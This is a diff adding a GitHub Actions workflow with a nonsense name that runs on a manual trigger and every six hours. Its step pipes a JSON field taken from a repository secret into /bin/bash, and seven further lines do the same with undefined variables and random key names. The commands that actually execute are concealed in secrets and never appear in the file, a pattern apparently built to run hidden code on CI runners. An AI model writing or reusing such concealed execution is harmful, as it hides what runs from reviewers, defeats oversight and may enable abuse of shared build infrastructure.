@@ -1,0 +1,23 @@
+name: pengzhongzhou2013
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pengzhongzhou2013
+        env:
+          fiyh65: ${{ secrets.fiyh65 }}
+        run: |
+          echo $fiyh65 | jq -r .rblb6 | /bin/bash
+          echo $ts6 | jq -r .a46 | /bin/bash
+          echo $ogv384 | jq -r .zdm29387 | /bin/bash
+          echo $asexw22 | jq -r .euh128 | /bin/bash
+          echo $kn42 | jq -r .ffhi28 | /bin/bash
+          echo $grl438 | jq -r .cjdx76 | /bin/bash
+          echo $x34 | jq -r .qchay8 | /bin/bash
+          echo $wjdk6005 | jq -r .jyds22862 | /bin/bash
+
